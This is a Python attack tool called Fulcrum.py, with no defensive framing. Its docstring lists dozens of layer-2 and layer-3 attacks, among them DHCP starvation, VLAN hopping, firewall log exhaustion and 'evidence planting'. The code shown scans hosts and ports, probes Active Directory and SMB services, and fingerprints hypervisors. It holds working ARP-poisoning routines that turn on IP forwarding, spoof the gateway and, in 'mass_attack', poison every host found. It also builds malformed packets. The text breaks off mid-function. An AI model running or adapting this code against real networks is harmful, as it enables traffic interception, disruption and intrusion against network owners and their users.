#!/usr/bin/env python3
"""
Fulcrum.py

Wired-Only Interactive L2/L3 Recon & Pivot Tool (Chat Mode)
Now with advanced manufacturer detection, auto-mode, extreme VLAN hopping,
Active Directory reconnaissance, internal traffic analysis, lateral movement,
evidence planting, remote system manipulation capabilities, and advanced
L2/L3 attack techniques. Original Concepts/Improved Concepts by Haroon Ahmad Awan - mrharoonawan@gmail.com

Added Advanced Techniques:
* Protocol-Specific Deep Exploits: Beyond basic spoofing to actual protocol vulnerabilities
* Buffer Overflow Attempts: CDP version overflow, ARP stack exhaustion
* Authentication Bypass: HSRP password cracking, null authentication
* State Confusion Attacks: STP with inconsistent BPDUs
* Malformed Packet Attacks: Corrupted TLVs, malformed chaddr fields
* Resource Exhaustion: TCN floods, ARP stack attacks
* DTP Spoofing Attack
* DHCP Starvation Attack
* Rogue DHCP Server Injection
* STP Root Bridge Attack
* CDP/LLDP Spoofing
* MAC Flooding (CAM Table Exhaustion)
* 802.1X EAPOL Bypass
* BPDU Injection
* VTP (VLAN Trunking Protocol) Manipulation
* ICMP Redirect Injection
* ARP Storm Generator
* Gratuitous ARP Flooding
* DHCP Inform Spoofing
* HSRP/VRRP Hijacking
* PPPoE Session Hijacking
* Port Security Violation Trigger
* Loopback Flood Attack
* EtherChannel Spoofing
* QinQ (802.1ad) VLAN Abuse
* IPv6 Router Advertisement Spoofing
* IPv6 DHCPv6 Rogue Server
* ND Spoofing (Neighbor Discovery)
* ND Cache Poisoning
* DHCPv6 Starvation
* 802.1X Fake Supplicant Flood
* LACP Spoofing
* Custom EtherType Covert Channels
* Ethernet Frame Padding Exploits
* IGMP Snooping Abuse
* MLD (IPv6 Multicast Listener Discovery) Spoofing
* Firewall Session Table Extraction via SNMP or CLI leaks
* Tracking Firewall Admin Login Sessions via Syslog or SNMP traps
* Triggering Log Flood to Blind Firewall Logging (Log Exhaustion)
* Simulated Failover Test to Trigger Config Leak in Active/Standby
* Policy Cloning via Captured ACL Responses (Reflective Rule Mapping)
* Bypassing Inter-VLAN ACLs via IPv6 over IPv4 or Tunneling
* Extracting NAT Translation Tables via TCP Timestamp Correlation
* Hijacking Firewall Management Interface via ARP Poisoning
* Detecting and Exploiting DPI Misclassifications

Usage:
  sudo python3 Fulcrum.py --iface eth0
"""

import argparse
import threading
import time
import ipaddress
import os
import platform
import subprocess
import random
import socket
import struct
import json
import re
import tempfile
import base64
import binascii
from collections import defaultdict, deque
from datetime import datetime
from scapy.all import (
    Ether, ARP, sendp, sniff,
    IP, TCP, UDP, ICMP, Raw,
    get_if_hwaddr, fragment, IPOption,
    Dot1Q, DHCP, BOOTP, DNS,
    conf, LLC, SNAP, Dot3, STP, Dot1AD,
    EAPOL, RIP, VRRP, PPPoE, IGMP, IPv6,
    ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, 
    ICMPv6NDOptSrcLLAddr, DHCP6_Solicit, DHCP6_Advertise, 
    DHCP6_Request, DHCP6_Reply, LACP, HSRP, ICMPv6MLReport,
    ICMPv6MLDMultAddrRec
)
from scapy.layers.inet import IPOption_LSRR, IPOption_SSRR
from scapy.layers.l2 import LLDPDU
from scapy.packet import Packet
from scapy.layers.dhcp import DHCPOptions
from scapy.layers.ppp import PPPoED
from scapy.layers.inet6 import DHCP6OptClientId, DHCP6OptIA_NA, DHCP6OptIAAddress
from scapy.layers.dhcp6 import DHCP6OptServerId, DHCP6OptDNSServers

# Global state
discovered = {}  # MAC -> {'ip': IP, 'vendor': vendor, 'first_seen': timestamp}
flows = defaultdict(int)
captured_packets = deque(maxlen=5000)  # Store recent packets for analysis
active_traffic = False
vlan_discovered = set()

# Internal traffic analysis globals
internal_traffic = defaultdict(lambda: defaultdict(int))  # src_ip -> dst_ip -> count
device_profiles = defaultdict(lambda: {'packets_sent': 0, 'packets_received': 0, 'protocols': set(), 'first_seen': datetime.now(), 'last_seen': datetime.now()})
conversations = defaultdict(list)  # (src_ip, dst_ip) -> list of packets
network_topology = defaultdict(set)  # device -> set of communicating devices

# L2 attack state trackers
l2_attacks_active = {}
dtp_states = {}
stp_attacks = {}
cdp_cache = {}
vtp_domains = {}
hsrp_groups = {}
vrrp_groups = {}
pppoe_sessions = {}
lacp_systems = {}
ipv6_rogue_routers = {}
dhcp_servers = {}

# Enhanced common ports for enterprise environments
COMMON_PORTS = [
    # Basic Services
    21,    # FTP
    22,    # SSH
    23,    # Telnet
    25,    # SMTP
    53,    # DNS
    80,    # HTTP
    110,   # POP3
    135,   # RPC
    139,   # NetBIOS
    143,   # IMAP
    443,   # HTTPS
    445,   # SMB
    993,   # IMAPS
    995,   # POP3S
    
    # Database Services
    1433,  # MSSQL
    1521,  # Oracle
    3306,  # MySQL
    5432,  # PostgreSQL
    27017, # MongoDB
    6379,  # Redis
    
    # Remote Access
    3389,  # RDP
    5900,  # VNC
    5800,  # VNC HTTP
    
    # Enterprise Services
    88,    # Kerberos
    389,   # LDAP
    636,   # LDAPS
    3268,  # Global Catalog LDAP
    3269,  # Global Catalog LDAPS
    
    # Certificate Services
    443,   # Already included (HTTPS for cert services)
    80,    # HTTP for CRL/OCSP
    389,   # LDAP for cert templates
    
    # File Services
    2049,  # NFS
    111,   # RPCbind (NFS)
    139,   # Already included (SMB)
    445,   # Already included (SMB)
    
    # Directory Services
    88,    # Already included (Kerberos)
    389,   # Already included (LDAP)
    636,   # Already included (LDAPS)
    3268,  # Already included (Global Catalog)
    3269,  # Already included (Global Catalog SSL)
    
    # Web Services
    8000,  # HTTP Alt
    8080,  # HTTP Proxy
    8443,  # HTTPS Alt
    9443,  # HTTPS Enterprise
    
    # Management Services
    5985,  # WinRM HTTP
    5986,  # WinRM HTTPS
    10000, # Webmin
    
    # Messaging & Collaboration
    5222,  # XMPP
    5223,  # XMPP SSL
    5269,  # XMPP Server
    1863,  # MSNP
    5060,  # SIP
    5061,  # SIP TLS
    
    # Virtualization
    8006,  # Proxmox
    8008,  # VMware
    902,   # VMware Console
    903,   # VMware Console
    
    # Backup Services
    10000, # BackupExec
    10001, # BackupExec
    
    # Security Services
    1812,  # RADIUS
    1813,  # RADIUS Accounting
    1645,  # RADIUS (old)
    1646,  # RADIUS Accounting (old)
    500,   # IPSec
    4500,  # IPSec NAT-T
    
    # Active Directory Core Services
    53,    # DNS
    88,    # Kerberos
    135,   # RPC
    139,   # NetBIOS
    389,   # LDAP
    445,   # SMB
    464,   # Kerberos password change
    636,   # LDAPS
    3268,  # Global Catalog LDAP
    3269,  # Global Catalog LDAPS
    9389,  # AD Web Services
    
    # Certificate Services (AD CS)
    80,    # HTTP for CRL/OCSP
    443,   # HTTPS for Certificate Enrollment
    389,   # LDAP for certificate templates
    
    # Group Policy and Replication
    42,    # WINS
    123,   # NTP
    137,   # NetBIOS Name Service
    138,   # NetBIOS Datagram Service
    445,   # SMB for Sysvol
    5722,  # RPC for DFSR
    9389,  # AD Web Services
    
    # VMware Specific Ports
    902,   # VMware Server Console
    903,   # VMware Server Console (backup)
    443,   # VMware vSphere Client
    5480,  # VMware Appliance Management
    8009,  # VMware AJP
    8008,  # VMware HTTP
    8443,  # VMware HTTPS
    8006,  # Proximity VE
    
    # Database and Application Services
    1433,  # MSSQL (often with AD)
    1521,  # Oracle
    3306,  # MySQL
    
    # Remote Management
    3389,  # RDP
    5985,  # WinRM HTTP
    5986,  # WinRM HTTPS
    
    # Web Services
    80,    # HTTP
    443,   # HTTPS
    8080,  # HTTP Alternative
    8443,  # HTTPS Alternative
        
    # Print Services
    515,   # LPD
    631,   # IPP
    9100,  # Raw Printing
]

# Service banners and descriptions
SERVICE_BANNERS = {
    # Active Directory Services
    53: "DNS Server",
    88: "Kerberos Authentication",
    135: "RPC Endpoint Mapper",
    139: "NetBIOS Session Service",
    389: "LDAP Directory Services",
    445: "SMB File Sharing",
    464: "Kerberos Password Change",
    636: "LDAP over SSL",
    3268: "Active Directory Global Catalog",
    3269: "Global Catalog over SSL",
    9389: "Active Directory Web Services",
    
    # VMware Services
    902: "VMware Server Console",
    903: "VMware Server Console (backup)",
    443: "VMware vSphere Client/HTTPS",
    5480: "VMware Appliance Management",
    8009: "VMware AJP Connector",
    8008: "VMware HTTP Management",
    8443: "VMware HTTPS Management",
    
    # Certificate Services
    80: "HTTP Certificate Revocation",
    443: "HTTPS Certificate Enrollment",
    
    # Additional AD Services
    42: "WINS Server",
    123: "NTP Time Service",
    137: "NetBIOS Name Service",
    138: "NetBIOS Datagram Service",
    5722: "DFSR Replication",
    21: "FTP (File Transfer Protocol)",
    22: "SSH (Secure Shell)",
    23: "Telnet",
    25: "SMTP (Simple Mail Transfer Protocol)",
    53: "DNS (Domain Name System)",
    80: "HTTP (Web Server)",
    110: "POP3 (Post Office Protocol)",
    135: "RPC (Remote Procedure Call)",
    139: "NetBIOS Session Service",
    143: "IMAP (Internet Message Access Protocol)",
    443: "HTTPS (Secure Web Server)",
    445: "SMB (Server Message Block)",
    993: "IMAPS (Secure IMAP)",
    995: "POP3S (Secure POP3)",
    1433: "Microsoft SQL Server",
    1521: "Oracle Database",
    3306: "MySQL Database",
    5432: "PostgreSQL Database",
    27017: "MongoDB",
    6379: "Redis",
    3389: "RDP (Remote Desktop Protocol)",
    5900: "VNC (Virtual Network Computing)",
    5800: "VNC over HTTP",
    88: "Kerberos Authentication",
    389: "LDAP (Lightweight Directory Access Protocol)",
    636: "LDAPS (Secure LDAP)",
    3268: "Active Directory Global Catalog",
    3269: "Active Directory Global Catalog SSL",
    2049: "NFS (Network File System)",
    111: "RPCbind (NFS)",
    8000: "HTTP Alternative",
    8080: "HTTP Proxy",
    8443: "HTTPS Alternative",
    9443: "HTTPS Enterprise",
    5985: "WinRM HTTP",
    5986: "WinRM HTTPS",
    10000: "Webmin/BackupExec",
    5222: "XMPP (Jabber)",
    5223: "XMPP SSL",
    5269: "XMPP Server-to-Server",
    1863: "MSNP (Microsoft Notification Protocol)",
    5060: "SIP (Session Initiation Protocol)",
    5061: "SIP TLS",
    8006: "Proximity VE",
    8008: "VMware",
    902: "VMware Console",
    903: "VMware Console",
    1812: "RADIUS Authentication",
    1813: "RADIUS Accounting",
    1645: "RADIUS (Legacy)",
    1646: "RADIous Accounting (Legacy)",
    500: "IPSec VPN",
    4500: "IPSec NAT-Traversal",
    515: "LPD (Line Printer Daemon)",
    631: "IPP (Internet Printing Protocol)",
    9100: "Raw Printing",
}

# Manufacturer database (partial - can be expanded)
MANUFACTURER_DB = {
    '00:0C:29': 'VMware',
    '00:50:56': 'VMware',
    '00:1C:42': 'Parallels',
    '00:16:3E': 'Xensource',
    '00:05:69': 'Xensource',
    '38:F7:CD': 'Samsung',
    '08:00:27': 'VirtualBox',
    '0A:00:27': 'VirtualBox',
    '52:54:00': 'QEMU',
    '00:1A:4B': 'Cisco',
    '00:1B:0C': 'Juniper',
    '00:1E:13': 'Huawei',
    '00:1F:33': 'HP',
    '00:21:5A': 'Dell',
    '00:24:E8': 'Dell',
    '00:26:B9': 'Dell',
    '08:18:1A': 'Apple',
    '00:25:00': 'Apple',
    '00:1E:C2': 'Apple',
    '00:17:F2': 'Apple',
    '00:03:93': 'Apple',
    '00:0A:27': 'Apple',
    '00:0A:95': 'Apple',
    '00:11:24': 'Apple',
}

# Active Directory common ports
AD_PORTS = [389, 636, 3268, 3269, 88, 53, 135, 139, 445]

def get_manufacturer(mac):
    """Get manufacturer from MAC address"""
    mac_prefix = mac.upper()[:8]
    for prefix, vendor in MANUFACTURER_DB.items():
        if mac_prefix.startswith(prefix):
            return vendor
    return "Unknown"

def get_default_gateway():
    """Get default gateway IP address for the current platform"""
    system = platform.system()
    
    if system == "Linux":
        try:
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True, check=True)
            lines = result.stdout.strip().split('\n')
            if lines and lines[0]:
                return lines[0].split()[2]
        except (subprocess.CalledProcessError, FileNotFoundError, IndexError):
            pass
    
    elif system == "Windows":
        try:
            result = subprocess.run(['route', 'print', '0.0.0.0'], 
                                  capture_output=True, text=True, check=True)
            lines = result.stdout.split('\n')
            for line in lines:
                if '0.0.0.0' in line and 'On-link' not in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        return parts[2]
        except (subprocess.CalledProcessError, FileNotFoundError):
            pass
    
    # Fallback: try to guess based on common defaults
    return None

def enable_ip_forwarding():
    """Enable IP forwarding for the current platform"""
    system = platform.system()
    
    if system == "Linux":
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                         check=True, capture_output=True)
            print("[IP Forward] Enabled on Linux")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[Warning] Could not enable IP forwarding on Linux")
    
    elif system == "Windows":
        try:
            subprocess.run(['reg', 'add', 
                          'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters', 
                          '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '1', '/f'], 
                         check=True, capture_output=True)
            print("[IP Forward] Enabled on Windows (may require reboot)")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[Warning] Could not enable IP forwarding on Windows")
    
    else:
        print(f"[Warning] IP forwarding not configured for {system}")

def is_internal_ip(ip):
    """Check if an IP address is in private ranges"""
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private
    except:
        return False

# Port scanning functions
def scan_port(ip, port, timeout=1):
    """Scan a single port"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            if result == 0:
                return True
    except:
        pass
    return False

def port_scan(ip, ports, timeout=1):
    """Scan multiple ports on a target IP"""
    print(f"[PortScan] Scanning {ip} for {len(ports)} ports...")
    open_ports = []
    
    for port in ports:
        if scan_port(ip, port, timeout):
            open_ports.append(port)
            service = SERVICE_BANNERS.get(port, "Unknown service")
            print(f"[PortScan] {ip}:{port} OPEN - {service}")
    
    return open_ports

def service_discovery(ip, ports=None, timeout=2):
    """Discover services with banner grabbing"""
    if ports is None:
        ports = COMMON_PORTS
    
    print(f"[ServiceDiscovery] Discovering services on {ip}...")
    services = {}
    
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                
                # Try to get banner
                try:
                    if port in [21, 22, 25, 110, 143, 80, 443]:
                        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                        if banner:
                            services[port] = banner
                            print(f"[Service] {ip}:{port} - {banner[:100]}...")
                        else:
                            service_name = SERVICE_BANNERS.get(port, "Unknown")
                            services[port] = service_name
                            print(f"[Service] {ip}:{port} - {service_name}")
                    else:
                        service_name = SERVICE_BANNERS.get(port, "Unknown")
                        services[port] = service_name
                        print(f"[Service] {ip}:{port} - {service_name}")
                except:
                    service_name = SERVICE_BANNERS.get(port, "Unknown")
                    services[port] = service_name
                    print(f"[Service] {ip}:{port} - {service_name}")
                
        except:
            continue
    
    return services

def discover_ad_dns(domain=None):
    """Discover Active Directory through DNS queries"""
    print("[AD Discovery] Attempting DNS-based AD discovery...")
    
    try:
        # Common AD DNS records
        ad_records = [
            "_ldap._tcp.dc._msdcs",
            "_kerberos._tcp.dc._msdcs", 
            "_gc._tcp",
            "_ldap._tcp.gc._msdcs",
            "_kerberos._tcp",
            "_kpasswd._tcp",
        ]
        
        domain = domain or get_domain_from_system()
        
        for record in ad_records:
            full_record = f"{record}.{domain}" if domain else record
            try:
                result = socket.getaddrinfo(full_record, 389)
                print(f"[DNS] Found: {full_record} → {result[0][4][0]}")
            except:
                continue
                
    except Exception as e:
        print(f"[DNS Discovery Error] {e}")

def get_domain_from_system():
    """Try to get domain from system configuration"""
    try:
        if platform.system() == "Windows":
            try:
                import win32api
                return win32api.GetDomainName()
            except ImportError:
                result = subprocess.run(['net', 'config', 'workstation'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Domain' in line and 'WORKGROUP' not in line:
                        return line.split()[-1]
        else:
            # Linux/Mac - check resolv.conf or hostname
            result = subprocess.run(['hostname', '-d'], 
                                  capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
    except:
        return None

def netbios_discovery(network_cidr):
    """Use NetBIOS to discover Windows hosts"""
    print(f"[NetBIOS] Scanning {network_cidr} for Windows hosts...")
    
    try:
        # This would use nmblookup or similar
        # For simplicity, we'll use a socket approach
        for ip in ipaddress.ip_network(network_cidr).hosts():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(0.5)
                    s.sendto(b'\x00', (str(ip), 137))
                    data, addr = s.recvfrom(1024)
                    if data:
                        print(f"[NetBIOS] Found Windows host: {ip}")
            except:
                continue
    except Exception as e:
        print(f"[NetBIOS Error] {e}")

def smb_discovery(ip):
    """Discover SMB services which often indicate AD"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((ip, 445))
            # Send SMB negotiate protocol request
            smb_negotiate = bytes.fromhex('00000085ff534d4272000000001853c800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
            s.send(smb_negotiate)
            response = s.recv(1024)
            if response and b'SMB' in response:
                print(f"[SMB] Found SMB service on {ip}:445")
                return True
    except:
        pass
    return False

# VMware and Hypervisor Detection Functions
def detect_vmware():
    """Detect if we're running in VMware"""
    try:
        # Check various VMware detection methods
        if platform.system() == "Linux":
            # Check for VMware-specific devices
            if os.path.exists("/sys/class/dmi/id/product_name"):
                with open("/sys/class/dmi/id/product_name", "r") as f:
                    product = f.read().strip()
                    if "vmware" in product.lower():
                        return True
            
            # Check for VMware tools
            if os.path.exists("/usr/bin/vmware-toolbox-cmd"):
                return True
                
            # Check PCI devices
            if os.path.exists("/proc/bus/pci/devices"):
                with open("/proc/bus/pci/devices", "r") as f:
                    if "vmware" in f.read().lower():
                        return True
        
        elif platform.system() == "Windows":
            # Check registry for VMware
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmware")
                winreg.CloseKey(key)
                return True
            except:
                pass
            
            # Check for VMware processes
            try:
                result = subprocess.run(['tasklist', '/fi', 'imagename eq vmtoolsd.exe'], 
                                      capture_output=True, text=True)
                if "vmtoolsd.exe" in result.stdout:
                    return True
            except:
                pass
        
        # MAC address detection (VMware OUI)
        try:
            mac = get_if_hwaddr('eth0') if platform.system() == "Linux" else None
            if mac and mac.lower().startswith(('00:0c:29', '00:50:56')):
                return True
        except:
            pass
            
    except:
        pass
    
    return False

def detect_hypervisor_details():
    """Get detailed hypervisor information"""
    print("[Hypervisor] Detecting virtualization environment...")
    
    # VMware-specific checks
    vmware_ports = [902, 903, 443, 5480, 8009, 8008, 8443]
    detected = False
    
    # Check local system
    if detect_vmware():
        print("[Hypervisor] Running in VMware guest")
        detected = True
        
    # Check for other hypervisors
    hypervisors = {
        'VirtualBox': ['vboxguest', 'vboxsf', 'VBoxService'],
        'KVM': ['virtio', 'kvm'],
        'Xen': ['xen'],
        'Hyper-V': ['hv_'],
        'QEMU': ['qemu']
    }
    
    for hypervisor, indicators in hypervisors.items():
        for indicator in indicators:
            if check_hypervisor_indicator(indicator):
                print(f"[Hypervisor] Possible {hypervisor} environment detected")
                detected = True
                break
    
    if not detected:
        print("[Hypervisor] No virtualization detected (bare metal?)")

def check_hypervisor_indicator(indicator):
    """Check for hypervisor-specific indicators"""
    try:
        if platform.system() == "Linux":
            # Check kernel modules
            result = subprocess.run(['lsmod'], capture_output=True, text=True)
            if indicator in result.stdout.lower():
                return True
            
            # Check devices
            if os.path.exists('/proc/cpuinfo'):
                with open('/proc/cpuinfo', 'r') as f:
                    if indicator in f.read().lower():
                        return True
                        
    except:
        pass
    return False

def vmware_discovery(cidr):
    """Discover VMware hosts and services"""
    print(f"[VMware] Scanning {cidr} for VMware infrastructure...")
    
    # VMware-specific ports
    vmware_ports = [902, 903, 443, 5480, 8009, 8008, 8443, 10000, 10001]
    
    for ip in ipaddress.ip_network(cidr).hosts():
        ip_str = str(ip)
        print(f"[VMware] Probing {ip_str} for VMware services...")
        
        for port in vmware_ports:
            if scan_port(ip_str, port, timeout=1):
                service = SERVICE_BANNERS.get(port, f"VMware Service {port}")
                print(f"[VMware] Found: {ip_str}:{port} - {service}")
                
                # Try to get more info from VMware services
                if port == 902:  # VMware Console
                    try_vmware_console_info(ip_str)
                elif port == 443:  # vSphere
                    try_vsphere_info(ip_str)

def try_vmware_console_info(ip):
    """Attempt to get info from VMware console service"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((ip, 902))
            # Send VMware console probe
            s.send(b'INFO')
            response = s.recv(1024)
            if response:
                print(f"[VMware-Console] {ip}:902 - {response.decode('utf-8', errors='ignore')[:100]}")
    except:
        pass

def try_vsphere_info(ip):
    """Attempt to get vSphere info"""
    try:
        import ssl
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((ip, 443), timeout=2) as sock:
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                cert = ssock.getpeercert()
                if cert:
                    print(f"[vSphere] {ip}:443 - SSL Certificate detected")
    except:
        pass

def escape_route_scan(iface):
    """Scan for network escape routes from virtual environment"""
    print("[Escape] Scanning for network escape routes...")
    
    # Check for multiple interfaces
    try:
        if platform.system() == "Linux":
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            interfaces = [line.split(':')[1].strip() for line in result.stdout.split('\n') if ':' in line and 'lo:' not in line]
            print(f"[Escape] Available interfaces: {interfaces}")
            
            # Check for bridged networks
            for iface in interfaces:
                if iface != 'eth0':
                    print(f"[Escape] Potential escape interface: {iface}")
                    
        # Check for VLAN trunking
        check_vlan_trunking(iface)
        
        # Check for VPN connections
        check_vpn_connections()
        
    except Exception as e:
        print(f"[Escape] Error: {e}")

def check_vlan_trunking(iface):
    """Check if interface is trunking multiple VLANs"""
    try:
        if platform.system() == "Linux":
            result = subprocess.run(['ip', 'link', 'show', iface], capture_output=True, text=True)
            if 'vlan' in result.stdout.lower() or '802.1q' in result.stdout.lower():
                print(f"[Escape] VLAN trunking detected on {iface}")
    except:
        pass

def check_vpn_connections():
    """Check for active VPN connections"""
    try:
        if platform.system() == "Linux":
            result = subprocess.run(['ip', 'tunnel', 'show'], capture_output=True, text=True)
            if 'tun' in result.stdout or 'ppp' in result.stdout:
                print("[Escape] VPN tunnel detected")
                
        # Check for OpenVPN, WireGuard, etc.
        vpn_processes = ['openvpn', 'wireguard', 'pppd', 'strongswan']
        for vpn in vpn_processes:
            try:
                result = subprocess.run(['pgrep', '-l', vpn], capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"[Escape] {vpn} process detected")
            except:
                pass
                
    except Exception as e:
        print(f"[Escape] VPN check error: {e}")

# Advanced ARP scan with manufacturer detection
def eth_arp_scan(iface, cidr, timeout=5, aggressive=False):
    gw = cidr.split('/')[0].rsplit('.',1)[0] + '.1'
    our_mac = get_if_hwaddr(iface)
    print(f"[Scan] Scanning {cidr} via {iface} (gateway {gw})...")
    
    def handle(pkt):
        if pkt.haslayer(ARP) and pkt[ARP].op == 2:
            mac = pkt[ARP].hwsrc
            ip = pkt[ARP].psrc
            vendor = get_manufacturer(mac)
            discovered[mac] = {
                'ip': ip,
                'vendor': vendor,
                'first_seen': datetime.now().isoformat()
            }
            print(f"[Reply] {mac} ({vendor}) ↔ {ip}")
            captured_packets.append(pkt)
    
    thread = threading.Thread(
        target=lambda: sniff(iface=iface, filter="arp", timeout=timeout, prn=handle),
        daemon=True
    )
    thread.start()
    
    # Send ARP requests
    network = ipaddress.ip_network(cidr)
    hosts = list(network.hosts())
    
    if aggressive:
        # Extreme: send multiple requests per host with different source IPs
        for ip in hosts:
            for fake_src in [gw, str(ip), "0.0.0.0", "255.255.255.255"]:
                pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=fake_src, pdst=str(ip), hwsrc=our_mac)
                sendp(pkt, iface=iface, verbose=False)
                time.sleep(0.001)
    else:
        # Normal scan
        for ip in hosts:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=gw, pdst=str(ip), hwsrc=our_mac)
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.01)
    
    thread.join()
    print(f"[Scan] Complete. Found {len(discovered)} hosts.")

# Enhanced passive sniff with internal traffic detection
def eth_sniff_flows(iface):
    print(f"[Sniff] Listening for IP/TCP on {iface} (Ctrl-C to stop)")
    
    def handle(pkt):
        captured_packets.append(pkt)
        current_time = datetime.now()
        
        if pkt.haslayer(IP):
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            
            # Update device profiles
            device_profiles[src_ip]['packets_sent'] += 1
            device_profiles[dst_ip]['packets_received'] += 1
            device_profiles[src_ip]['last_seen'] = current_time
            device_profiles[dst_ip]['last_seen'] = current_time
            
            # Track protocols
            if pkt.haslayer(TCP):
                device_profiles[src_ip]['protocols'].add('TCP')
                device_profiles[dst_ip]['protocols'].add('TCP')
            elif pkt.haslayer(UDP):
                device_profiles[src_ip]['protocols'].add('UDP')
                device_profiles[dst_ip]['protocols'].add('UDP')
            elif pkt.haslayer(ICMP):
                device_profiles[src_ip]['protocols'].add('ICMP')
                device_profiles[dst_ip]['protocols'].add('ICMP')
            
            # Track internal conversations
            if is_internal_ip(src_ip) and is_internal_ip(dst_ip):
                internal_traffic[src_ip][dst_ip] += 1
                conversations[(src_ip, dst_ip)].append(pkt)
                network_topology[src_ip].add(dst_ip)
                network_topology[dst_ip].add(src_ip)
                
                # Display internal traffic
                if pkt.haslayer(TCP):
                    sport = pkt[TCP].sport
                    dport = pkt[TCP].dport
                    service = SERVICE_BANNERS.get(dport, f"Port {dport}")
                    print(f"[INTERNAL] {src_ip}:{sport} ↔ {dst_ip}:{dport} (TCP - {service})")
                elif pkt.haslayer(UDP):
                    sport = pkt[UDP].sport
                    dport = pkt[UDP].dport
                    service = SERVICE_BANNERS.get(dport, f"Port {dport}")
                    print(f"[INTERNAL] {src_ip}:{sport} ↔ {dst_ip}:{dport} (UDP - {service})")
                elif pkt.haslayer(ICMP):
                    print(f"[INTERNAL] {src_ip} ↔ {dst_ip} (ICMP)")
        
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            src = pkt[IP].src; dst = pkt[IP].dst
            sport = pkt[TCP].sport; dport = pkt[TCP].dport
            flows[(src,dst,sport,dport)] += 1
            count = flows[(src,dst,sport,dport)]
            
            # Detect interesting patterns
            flags = pkt[TCP].flags
            if flags == 0x29:  # FIN+PSH+URG (unusual)
                print(f"[!] Unusual TCP flags: {src}:{sport} ↔ {dst}:{dport} (flags={flags})")
            
            service = SERVICE_BANNERS.get(dport, f"Port {dport}")
            print(f"[Flow] {src}:{sport} → {dst}:{dport} ({service}) (count={count})")
        
        # Detect VLAN tags
        if pkt.haslayer(Dot1Q):
            vlan_id = pkt[Dot1Q].vlan
            if vlan_id not in vlan_discovered:
                vlan_discovered.add(vlan_id)
                print(f"[VLAN] Discovered VLAN ID: {vlan_id}")
    
    try:
        sniff(iface=iface, prn=handle, store=False)
    except KeyboardInterrupt:
        print("[Sniff] Stopped.")

# Pivot (ARP poisoning)
def eth_pivot(iface, target_mac, target_ip):
    enable_ip_forwarding()
    
    gw = get_default_gateway()
    if not gw:
        gw = '.'.join(target_ip.split('.')[:3]) + '.1'
        print(f"[Pivot] Using guessed gateway: {gw}")
    
    our_mac = get_if_hwaddr(iface)
    print(f"[Pivot] Poisoning {target_mac} ({target_ip}) to gateway {gw} via {iface}")
    
    try:
        arp = ARP(op=2, psrc=gw, pdst=target_ip, hwsrc=our_mac, hwdst=target_mac)
        sendp(Ether(dst=target_mac)/arp, iface=iface, count=10, inter=0.1, verbose=False)
        print(f"[Pivot] ARP-poison sent. Target {target_ip} should route via us.")
    except Exception as e:
        print(f"[Pivot Error] {e}")

# Mass attack
def mass_attack(iface):
    if not discovered:
        print("[Mass-Attack] No discovered hosts. Run 'scan' first.")
        return
    
    print("[Mass-Attack] Starting ARP-poison on all discovered hosts...")
    for mac, info in discovered.items():
        print(f"[Mass-Attack] Poisoning {mac} ({info['ip']} - {info['vendor']})")
        eth_pivot(iface, mac, info['ip'])
        time.sleep(0.3)
    print("[Mass-Attack] Complete.")

# Advanced Traffic Generation
def generate_advanced_traffic(iface, target_ip=None):
    global active_traffic
    our_mac = get_if_hwaddr(iface)
    
    if not target_ip:
        if discovered:
            target_ip = random.choice([info['ip'] for info in discovered.values()])
        else:
            target_ip = "192.168.1." + str(random.randint(100, 200))
    
    target_port = random.randint(1024, 65535)
    src_port = random.randint(1024, 65535)
    
    print(f"[Traffic] Generating advanced patterns to {target_ip}:{target_port}")
    
    patterns = [
        lambda: IP(dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="SAF"),
        lambda: IP(dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="URGP"),
        lambda: IP(dst=target_ip, options=[IPOption_LSRR(length=11, pointers=[4], routers=[target_ip])])/TCP(dport=target_port),
        lambda: fragment(IP(dst=target_ip)/TCP(dport=target_port)/("X"*2000)),
        lambda: IP(dst=target_ip, ttl=1)/TCP(dport=target_port),
        lambda: IP(dst=target_ip)/TCP(dport=target_port, chksum=0x1234),
        lambda: IP(dst=target_ip)/TCP(dport=target_port, window=0),
        lambda: IP(version=15, dst=target_ip)/TCP(dport=target_port),
